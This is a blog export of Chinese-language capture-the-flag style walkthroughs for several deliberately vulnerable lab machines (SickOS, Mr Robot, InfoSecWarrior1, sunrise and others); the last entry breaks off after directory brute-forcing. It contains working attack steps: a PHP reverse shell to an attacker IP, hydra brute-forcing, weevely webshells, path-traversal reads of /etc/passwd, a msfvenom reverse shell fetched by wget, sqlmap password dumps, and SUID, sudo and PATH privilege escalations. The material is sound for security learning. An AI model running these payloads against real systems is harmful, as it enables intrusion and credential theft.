<p><img src="https://img-blog.csdnimg.cn/2020050621014327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>站点代理<br><img src="https://img-blog.csdnimg.cn/20200506221312734.png" alt="在这里插入图片描述"></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.80.3&#x2F;robots.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200506221348898.png" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.80.3&#x2F;wolfcms&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200506221419396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.80.3&#x2F;wolfcms&#x2F;?admin</span><br></pre></td></tr></table></figure>
<p>弱密码测试<br><img src="https://img-blog.csdnimg.cn/20200506221726576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>创建shell<br><img src="https://img-blog.csdnimg.cn/20200506222237527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php exec(&quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.80.2&#x2F;4444 0&gt;&amp;1&#39;&quot;);?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>获得shell</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200506222312720.png" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;wolfcms&#x2F;</span><br><span class="line">cat config.php</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200506222455246.png" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -L sshusers.txt -p john@123 192.168.80.3 ssh</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200506223129466.png" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh sickos@192.168.80.3</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200506223256654.png" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200506223357510.png" alt="在这里插入图片描述"></p>
<p>END<br><img src="https://img-blog.csdnimg.cn/20200506223347619.png" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>Vulhub mrRoot</title>
    <url>/2020/08/21/Vulhub%20mrRoot/</url>
    <content><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>hydra 密码爆破</li>
<li>nmap 提权 </li>
</ul>
<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.80.35-100</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200501193126732.png" alt="在这里插入图片描述"></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -A -T4 192.168.80.43  -oA nmap&#x2F;nmap</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200501193300664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="站点目录爆破"><a href="#站点目录爆破" class="headerlink" title="站点目录爆破"></a>站点目录爆破</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.80.43 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -t50 -q dir.out</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200501201051247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.80.43&#x2F;robots.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200501204409338.png" alt="在这里插入图片描述"><br>获得字典</p>
<h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><p>使用hydra 的post 模块进行爆破<br><img src="https://img-blog.csdnimg.cn/20200501204845750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200501204920990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -L fsocity.dic -p passwd -t 64  192.168.80.43 http-post-form &quot;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^:Invalid username&quot; -f -V</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200501211821204.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200501211625905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l ELLIOT  -P fsocity.dic  -t 64 192.168.80.43 http-post-form &quot;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^:The password you entered&quot; -V</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200501213152152.png" alt="在这里插入图片描述"></p>
<h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><ul>
<li>生成shell</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">weevely generate 123  .&#x2F;sh.php</span><br></pre></td></tr></table></figure>

<ul>
<li>上传webshell</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20200501215302976.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200501215319207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li><p>登录</p>
<p><img src="https://img-blog.csdnimg.cn/20200501221114496.png" alt="在这里插入图片描述"></p>
</li>
<li><p>爆破获得密码</p>
<p>abcdefghijklmnopqrstuvwxyz</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2></li>
</ul>
<ul>
<li>创建伪终端</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">su robot</span><br></pre></td></tr></table></figure>


<p><img src="https://img-blog.csdnimg.cn/20200501224030317.png" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; type  f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200501230119204.png" alt="在这里插入图片描述"></p>
<ul>
<li>nmap 提权</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200501230649119.png" alt="在这里插入图片描述"><br>END<br><img src="https://img-blog.csdnimg.cn/20200501230701852.png" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>Vulhub  InfoSecWarrior1</title>
    <url>/2020/08/21/Vulhub%20%20InfoSecWarrior1/</url>
    <content><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>rpm SUID提权</p>
<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200427181907628.png" alt="在这里插入图片描述"></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -A -T5 192.168.80.40</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200427182016636.png" alt="在这里插入图片描述"></p>
<h2 id="站点目录爆破"><a href="#站点目录爆破" class="headerlink" title="站点目录爆破"></a>站点目录爆破</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.80.40 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -t50 -q</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200427185434718.png" alt="在这里插入图片描述"></p>
<ul>
<li>信息收集</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.80.40&#x2F;sitemap.xml</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200427182710805.png" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.80.40&#x2F;index.htnl</span><br></pre></td></tr></table></figure>
<p>发现隐藏表单，删除hidden字段页面显示表单<br><img src="https://img-blog.csdnimg.cn/20200427183241484.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200427183411401.png" alt="在这里插入图片描述"><br>输入任意数值，页面跳转，提示切换请求方法<br><img src="https://img-blog.csdnimg.cn/20200427183208609.png" alt="在这里插入图片描述"><br>更改表单为post方法</p>
<p><img src="https://img-blog.csdnimg.cn/20200427184051160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>获取密码<br><img src="https://img-blog.csdnimg.cn/20200427184447730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh isw0@192.168.80.40</span><br></pre></td></tr></table></figure>

<ul>
<li>SUID提权</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200427184833309.png" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rpm --eval &#39;%&#123;lua:os.execute(&quot;&#x2F;bin&#x2F;sh&quot;)&#125;&#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200427185027443.png" alt="在这里插入图片描述"></p>
<p>END<br><img src="https://img-blog.csdnimg.cn/20200427185049569.png" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>vulhub inclusiveness</title>
    <url>/2020/08/21/vulhub%20inclusiveness/</url>
    <content><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>FTP webshell写入<br>环境变量写入【popen()的使用】</p>
<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200426195320373.png" alt="在这里插入图片描述"></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -A -T5 192.168.80.39 -oA nmap&#x2F;nmap</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200426200913390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><ul>
<li>信息收集</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.80.39 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -t50 -q</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200426195926366.png" alt="在这里插入图片描述"><br>访问站点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.80.39&#x2F;robots.txt</span><br></pre></td></tr></table></figure>

<p> 提示说不是搜索引擎<img src="https://img-blog.csdnimg.cn/20200426200305431.png" alt="在这里插入图片描述"><br>更改User-Agent获取信息<br><img src="https://img-blog.csdnimg.cn/20200426200359884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>文件包含漏洞</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.80.39&#x2F;secret_information&#x2F;?lang&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200426200618679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>获取FTP写入文件保存位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.80.39&#x2F;secret_information&#x2F;?lang&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;vsftpd.conf</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200426202311940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>FTP写入文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">**生成webshell**</span><br><span class="line">weevely generate 123 sh.php</span><br><span class="line">**写入webshell**</span><br><span class="line">ftp 192.168.80.39</span><br><span class="line">cd pub</span><br><span class="line">put sh.php</span><br></pre></td></tr></table></figure>
<h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">weevely http:&#x2F;&#x2F;192.168.80.39&#x2F;secret_information&#x2F;\?lang\&#x3D;&#x2F;var&#x2F;ftp&#x2F;pub&#x2F;sh.php 123</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200426203032941.png" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://img-blog.csdnimg.cn/20200426210615759.png" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;tom&#x2F;rootshell.c</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200426204325407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>通过代码可以知道，通过popen执行whoami命令来判断当前用户<br>由于popen()会继承环境变量，所以添加环境变量即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo &quot;printf &quot;tom&quot;&quot; &gt; whoami</span><br><span class="line">chmod +x whoami</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;home&#x2F;tom</span><br><span class="line">.&#x2F;rootshell</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200426210522274.png" alt="在这里插入图片描述"><br>END<br><img src="https://img-blog.csdnimg.cn/20200426210536920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>Vulhub sunrise</title>
    <url>/2020/08/21/Vulhub%20sunrise/</url>
    <content><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>nikto 获取信息<br>mysql 获取信息<br>文件包含<br>msfvenom 简单使用</p>
<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200425193954348.png" alt="在这里插入图片描述"></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -A -T4 192.168.80.38</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200425194310384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nikto -url http:&#x2F;&#x2F;192.168.80.38:8080</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200425194200201.png" alt="在这里插入图片描述"></p>
<ul>
<li>存在文件包含<br><img src="https://img-blog.csdnimg.cn/20200425194833976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200425200149602.png" alt="在这里插入图片描述"><h2 id="SSH连接获取shell"><a href="#SSH连接获取shell" class="headerlink" title="SSH连接获取shell"></a>SSH连接获取shell</h2></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh weborf@192.168.80.38</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200425200525936.png" alt="在这里插入图片描述"></p>
<h2 id="登录mysql"><a href="#登录mysql" class="headerlink" title="登录mysql"></a>登录mysql</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u weborf -p</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200425200916365.png" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>转为sunrise用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">su sunrise</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200425201551859.png" alt="在这里插入图片描述"></p>
<ul>
<li>制作反弹shell</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.80.31 lport&#x3D;4444 -f exe &gt;pass.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>上传shell<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击机</span><br><span class="line">python3 -m http.server 80</span><br><span class="line">靶机</span><br><span class="line">wget -c http:&#x2F;&#x2F;192.168.80.31&#x2F;pass.exe</span><br><span class="line">sudo &#x2F;usr&#x2F;bin&#x2F;wine pass.exe</span><br></pre></td></tr></table></figure>
<img src="https://img-blog.csdnimg.cn/20200425202322335.png" alt="在这里插入图片描述"><br>END<br><img src="https://img-blog.csdnimg.cn/20200425202458453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Vulhub vulnUni_1.0.1</title>
    <url>/2020/08/21/Vulhub%20vulnUni_1.0.1/</url>
    <content><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>owasp-zap站点目录爬取<br>sqlmap的使用<br>文件上传</p>
<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020042419570431.png" alt="在这里插入图片描述"></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -A -T5 192.168.80.36 -oA nmap&#x2F;nmap</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200424200000917.png" alt="在这里插入图片描述"></p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><ul>
<li>信息收集<br>使用owasp-zap 爬取站点<br>获得新的站点目录<br><img src="https://img-blog.csdnimg.cn/20200424202809679.png" alt="在这里插入图片描述"><br>登录<br><img src="https://img-blog.csdnimg.cn/2020042420284218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>获取shell<br>弱口令测试，发现页面重定向<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;192.168.80.36 vulnuni.local&quot;&gt;&gt;&#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure></li>
<li>sqlmap爆破<br><img src="https://img-blog.csdnimg.cn/20200425165225529.png" alt="在这里插入图片描述"></li>
</ul>
<p>数据库爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r sql.txt  --dbs --batch</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200424205329496.png" alt="在这里插入图片描述"><br>数据表爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r sql.txt -D eclass --tables --batch</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200424210357629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>列爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r sql.txt -D eclass -T  --columns --batch</span><br></pre></td></tr></table></figure>
<p>获取数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -r sql.txt -D eclass -T user -C password --dump --batch</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200424214300656.png" alt="在这里插入图片描述"></p>
<p> 获得密码</p>
<ul>
<li>获取反弹shell<br>浏览页面发现上传文件页面<br><img src="https://img-blog.csdnimg.cn/20200424212323521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传shell<br><img src="https://img-blog.csdnimg.cn/20200425165317215.png" alt="在这里插入图片描述"></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20200424212929275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>获得shell<br><img src="https://img-blog.csdnimg.cn/20200424214328621.png" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname -r</span><br><span class="line">3.11.0-15-generic</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200424214848285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>编译运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread</span><br></pre></td></tr></table></figure>

<p>END<br><img src="https://img-blog.csdnimg.cn/2020042422043445.png" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>Vulhub-Fire86-2</title>
    <url>/2020/08/21/Vulhub-Fire86-2/</url>
    <content><![CDATA[<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200424110824625.png" alt="在这里插入图片描述"></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -A -T4 192.168.80.34</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200422213755507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在/etc/hosts 下加入 Five86-2</p>
<h2 id="web目录爆破"><a href="#web目录爆破" class="headerlink" title="web目录爆破"></a>web目录爆破</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.80.34 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -t50 -q -o out.dir</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020042221392645.png" alt="在这里插入图片描述"></p>
